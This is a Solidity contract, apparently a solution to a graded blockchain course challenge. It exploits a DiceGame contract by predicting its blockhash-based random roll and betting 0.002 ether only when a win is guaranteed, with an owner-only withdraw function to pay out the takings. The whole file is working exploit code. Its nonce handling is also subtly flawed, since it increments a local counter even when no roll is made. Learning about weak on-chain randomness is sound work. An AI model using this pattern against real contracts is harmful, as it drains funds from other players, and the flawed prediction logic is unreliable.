pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    uint256 public nonce;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Not enough ETH in the contract");

        // Predict the dice roll outcome
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted Dice Roll: ", roll);

        // Only roll the dice if it's a winning roll (i.e., roll is <= 5)
        if (roll <= 5) {
            // Call rollTheDice() with 0.002 ether
            diceGame.rollTheDice{value: 0.002 ether}();
            console.log("Winning roll! Called rollTheDice.");
        } else {
            console.log("Roll not favorable. Did not call rollTheDice.");
        }

        // Increment nonce to ensure we sync with DiceGame's nonce
        nonce++;
    }
    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
    require(address(this).balance >= _amount, "Insufficient balance in the contract");
    address payable to = payable(_addr);
    to.transfer(_amount);
    }
}
